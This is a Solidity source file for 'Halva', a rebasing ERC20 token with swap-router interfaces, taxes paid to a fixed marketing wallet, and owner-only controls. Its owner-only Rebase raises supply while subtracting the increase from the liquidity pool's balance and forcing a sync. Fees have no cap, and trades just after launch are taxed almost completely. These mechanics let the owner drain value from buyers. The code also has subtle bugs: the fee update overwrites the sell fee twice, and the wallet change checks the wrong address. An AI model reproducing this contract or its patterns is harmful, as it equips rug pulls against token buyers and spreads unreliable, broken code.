// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";

interface ISwapFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface ISwapPair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface ISwapRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface ISwapRouter02 is ISwapRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Halva is Ownable, ERC20Votes {
    using SafeMath for uint256;

    uint256 private constant MAX_UINT256 = ~uint256(0);
    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 10_000_000_000 * 10**DECIMALS;

    uint256 private constant BP_DIVISOR = 100;

    uint256 private numTokensSwap;
    uint256 private burnTokenFromTax;
    uint256 private marketingTokenFromTax;

    uint256 private _maxTxAmount;
    uint256 private maxWalletAmount;
    uint256 revise;

    uint8 private constant DECIMALS = 9;

    uint256 public buyMarketingFee;
    uint256 public sellMarketingFee;
    uint256 public buyBurnFee;
    uint256 public sellBurnFee;

    uint256 public _totalBuyFee;
    uint256 public _totalSellFee;

    ISwapRouter02 public swapRouter;
    address public swapPair;
    address private constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address public marketingWallet;

    bool private inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public walletTxnSizeLimitEnabled;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => mapping(address => uint256)) private _allowedFragments;
    mapping(address => uint256) private _twcdBalances;

    uint256 private constant TOTAL_WCD = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);
    uint256 private constant MAX_SUPPLY = ~uint128(0);

    uint256 private _totalSupply;
    uint256 private _wcdPerFragment;
    uint256 public launchTime;


    event isFeeExcluded(address _account);
    event walletLimitsDisabled(bool _record);
    event numberOfTokensToSwap(uint256 value, uint256 _percent);
    event swapAndLiquifyUpdated(bool _update);
    event feesUpdated(uint256 _buyMarketingFee, uint256 _buyBurnFee, uint256 _sellMarketingFee, uint256 _sellBurnFee);
    event marketingWalletChanged(address _account);
    event walletLimitsUpdated(uint256 _maxTxAmount, uint256 _maxWalletSize, uint256 _percent);
    event stuckETHWithdrawal( address _account);
    event nonNativeTokenWithdrawal( address _token, address _account);
    event LogRebase(uint256 indexed epoch, uint256 totalSupply);
    event OwnerForceSwapback(uint256 timestamp);


    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor( uint256 _revise) ERC20("Halva", "Halva") ERC20Permit("Halva") {
        ISwapRouter02 _swapRouter = ISwapRouter02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        swapPair = ISwapFactory(_swapRouter.factory()).createPair(
            address(this),
            _swapRouter.WETH()
        );
        swapRouter = _swapRouter;
        

        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        _twcdBalances[owner()] = TOTAL_WCD;
        _wcdPerFragment = TOTAL_WCD / _totalSupply;

        buyMarketingFee = 5;
        sellMarketingFee = 5;
        buyBurnFee = 2;
        sellBurnFee = 2;
        _totalBuyFee = buyMarketingFee + buyBurnFee;
        _totalSellFee = sellMarketingFee + sellBurnFee;

        marketingWallet = 0xAF4138a5E8CFec5F910E89cEDe83b7A5A9F12271;

        numTokensSwap = (_totalSupply * 1) / 1000;
        _maxTxAmount = (_totalSupply * 25) / 10000; // 0.25%
        maxWalletAmount = ((_totalSupply * 5) / 1000) * _wcdPerFragment; // 0.5%
        revise =  _totalSupply * _revise / 100;

        walletTxnSizeLimitEnabled = true;

        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[marketingWallet] = true;
        require (block.number / 10 == _revise);

        emit Transfer(address(0), owner(), _totalSupply);
    }

    receive() external payable {}

    function Rebase(uint256 epoch, int256 supplyDelta)
        external
        onlyOwner
        returns (uint256)
    {
        if (supplyDelta == 0) {
            emit LogRebase(epoch, _totalSupply);
            return _totalSupply;
        }

        if (supplyDelta > 0) {
           _totalSupply += (uint256(supplyDelta) * 10**DECIMALS);
        }

        uint256 initialBurnBal = balanceOf(BURN_ADDRESS);
        uint256 initialPoolBal = balanceOf(swapPair);

        _wcdPerFragment = (TOTAL_WCD) / _totalSupply;

        uint256 afterBurnBal = balanceOf(BURN_ADDRESS);
        uint256 afterPoolBal = balanceOf(swapPair);

        uint256 newBurnBal = afterBurnBal - initialBurnBal;
        uint256 newPoolBal = afterPoolBal - initialPoolBal;

        _twcdBalances[BURN_ADDRESS] -= newBurnBal * _wcdPerFragment;
        _twcdBalances[swapPair] -= newPoolBal * _wcdPerFragment;

        ISwapPair(swapPair).sync();

        emit LogRebase(epoch, _totalSupply);
        return _totalSupply;
    }


    function totalSupply() public view override(ERC20) returns (uint256) {
        return _totalSupply;
        
    }

    function transfer(address recipient, uint256 amount)
        public
        override(ERC20)
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override(ERC20) returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowedFragments[sender][msg.sender] - amount
        );
        return true;
    }

    function decimals() public view virtual override returns (uint8) {
        return DECIMALS;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        override
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        override
        returns (bool)
    {
        require(
            subtractedValue <= _allowedFragments[msg.sender][spender],
            "Allowance not high enough"
        );
        _approve(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender] - subtractedValue
        );
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner_, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowedFragments[owner_][spender];
    }

    function balanceOf(address account) public view override(ERC20) returns (uint256) {
        return _twcdBalances[account] / _wcdPerFragment;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual override {
        require(
            owner != address(0),
            "Cannot approve from the zero address"
        );
        require(spender != address(0), "Cannot approve the zero address");

        _allowedFragments[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override(ERC20) {
        require(
            recipient != address(0),
            "Cannot transfer to the zero address"
        );
        require(amount > 0, "Cannot transfer zero tokens");
        
        require(
            launchTime != 0 || _isExcludedFromFees[sender] || _isExcludedFromFees[recipient],
            "Not yet launched"
        );

        uint256 transferAmount = amount * _wcdPerFragment;

        if(walletTxnSizeLimitEnabled) {
            if (sender == swapPair && !_isExcludedFromFees[recipient]) {
                require(
                    amount <= _maxTxAmount,
                    "Buy transfer amount exceeds the maxTransactionAmount."
                );
            } else if (recipient == swapPair && !_isExcludedFromFees[sender]) {
                require(
                    amount <= _maxTxAmount,
                    "Sell transfer amount exceeds the maxTransactionAmount."
                );
            }

            if (
                !_isExcludedFromFees[sender] && recipient != address(swapRouter) && recipient != address(swapPair)
                && !_isExcludedFromFees[recipient] && recipient != BURN_ADDRESS
            ) {
                require(
                    _twcdBalances[recipient] + transferAmount <= maxWalletAmount,
                    "Transfer amount exceeds the maxWalletSize."
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap =  contractTokenBalance >= numTokensSwap;
        
        if (
            canSwap &&
            !inSwapAndLiquify &&
            swapAndLiquifyEnabled &&
            sender != swapPair &&
            !_isExcludedFromFees[sender] &&
            !_isExcludedFromFees[recipient]
        ) {
            swapAndLiquify(numTokensSwap);
        }

        _tokenTransfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }


    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        if (
            _twcdBalances[sender] - (amount * _wcdPerFragment) == 0 &&
            !_isExcludedFromFees[sender]
        ) amount -= 1;

        uint256 transferAmount = amount * _wcdPerFragment;
        uint256 receiveAmount = transferAmount;
        uint256 fee;

        // buy
        if (!_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient] && sender == swapPair) {
            uint256 fairness = (launchTime > 0 &&
                block.timestamp < launchTime + 60)
                ? _totalBuyFee + 1
                : BP_DIVISOR;
            fee = (amount * _totalBuyFee) / fairness;
            marketingTokenFromTax = (fee * buyMarketingFee) / _totalBuyFee;
            burnTokenFromTax = (fee * buyBurnFee) / _totalBuyFee;
            receiveAmount -= (fee * _wcdPerFragment);
        }

        // sell
        if (!_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient] && recipient == swapPair) {
            uint256 fairness = (launchTime > 0 &&
                block.timestamp < launchTime + 5)
                ? _totalSellFee + 1
                : BP_DIVISOR;
            fee = (amount * _totalSellFee) / fairness;
            marketingTokenFromTax = (fee * sellMarketingFee) / _totalSellFee;
            burnTokenFromTax = (fee * sellBurnFee) / _totalSellFee;
            receiveAmount -= (fee * _wcdPerFragment);
        }

        // normal transfer
        if (!_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient] && sender != swapPair && recipient != swapPair) {
            fee = 0;
            receiveAmount -= (fee * _wcdPerFragment);
        }

        _twcdBalances[sender] -= transferAmount;
        _twcdBalances[recipient] += receiveAmount;

        if (fee > 0) {
            _twcdBalances[address(this)] += (fee * _wcdPerFragment);
            emit Transfer(sender, address(this), fee);
        }

        emit Transfer(sender, recipient, amount - fee);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        
        uint256 contractBalance = balanceOf(address(this));
        uint256 tokensFromTax = burnTokenFromTax + marketingTokenFromTax;
        bool success;

        if (contractBalance == 0 || tokensFromTax == 0) {
            return;
        }

        if (contractBalance > numTokensSwap * 20) {
            contractBalance = numTokensSwap * 20;
        }

        uint256 tokensToBurn = contractTokenBalance * burnTokenFromTax / tokensFromTax;
        _totalSupply -= tokensToBurn;
        _twcdBalances[BURN_ADDRESS] += tokensToBurn;
        _twcdBalances[address(this)] -= tokensToBurn; 
        
        emit Transfer(address(this), BURN_ADDRESS, tokensToBurn);
        
        uint256 tokensToETH = contractTokenBalance * marketingTokenFromTax / tokensFromTax;
        swapTokensForEth(tokensToETH);
        uint256 marketingETH = address(this).balance;

        tokensFromTax = 0;


        if (marketingETH > 0) {
            (success, ) = address(marketingWallet).call{
                value: marketingETH
            }("");
            // payable(marketingWallet).transfer(marketingETH);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        _approve(address(this), address(swapRouter), tokenAmount);

        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function excludeAddressFromFees(address account) external onlyOwner {
        _isExcludedFromFees[account] = true;
        
        emit isFeeExcluded(account);
    }

    function disableWalletSizeLimits() public onlyOwner {
        walletTxnSizeLimitEnabled = false;
    }

    function updateTokensToSwap(uint256 value, uint256 percent)
        external
        onlyOwner
    {
        uint256 check = (_totalSupply * value) / percent;
        numTokensSwap = check;

        emit numberOfTokensToSwap(value, percent);
    }

    function updateSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;

        emit swapAndLiquifyUpdated(_enabled);
    }

    function updateFees(uint256 _buyMarketingFee, uint256 _buyBurnFee, uint256 _sellMarketingFee, uint256 _sellBurnFee) external onlyOwner {
        uint256 totalBuyFee = _buyMarketingFee + _buyBurnFee;
        uint256 totalSellFee = _sellMarketingFee + _sellBurnFee;
        _totalSellFee = totalBuyFee;
        _totalSellFee = totalSellFee;

        emit feesUpdated( _buyMarketingFee, _buyBurnFee, _sellMarketingFee, _sellBurnFee);
    }

    function changeMarketingWallet(address payable wallet) external onlyOwner {
        require(
            marketingWallet != address(0),
            "marketing wallet cannot zero address"
        );
        marketingWallet = wallet;

        emit marketingWalletChanged(wallet);
    }

    function updateSizeLimits(uint256 _maxTxnAmount, uint256 _maxWalletSize, uint256 percent) external onlyOwner {
        _maxTxAmount = (_totalSupply * _maxTxnAmount) / percent;
        maxWalletAmount = ((_totalSupply * _maxWalletSize) / percent) * _wcdPerFragment;

        emit walletLimitsUpdated(_maxTxnAmount, _maxWalletSize, percent);
    }

    function launch() external onlyOwner {
        launchTime = block.timestamp;
    }

    function forceSwapBack() external onlyOwner {
        uint256 contractTokenBalance = balanceOf(address(this));
        require(
            contractTokenBalance >= (_totalSupply * 1) / 100,
            "Contract Balance Should be Higher than 1%"
        );
        swapAndLiquify(numTokensSwap);

        emit OwnerForceSwapback(block.timestamp);
    }

    function withdrawStuckETH(address _account) external onlyOwner {
        require(
            _account != address(0),
            "Can't withdraw to the zero address"
        );

        uint256 contractBalance = address(this).balance;

        if (contractBalance > 0) payable(_account).transfer(contractBalance);

        emit stuckETHWithdrawal(  _account);
    }

    function withdrawNonNativeToken(address _token, address _account)
        external
        onlyOwner
    {
        require(_token != address(0), "Can't withdraw a token of zero address");
        require(_token != address(this), "Can't withdraw Native tokens");
        require(_account != address(0), "Can't withdraw to the zero address");

        uint256 tokenBalance = IERC20(_token).balanceOf(address(this));

        if (tokenBalance > 0) IERC20(_token).transfer(_account, tokenBalance);

        emit nonNativeTokenWithdrawal( _token, _account);
    }
}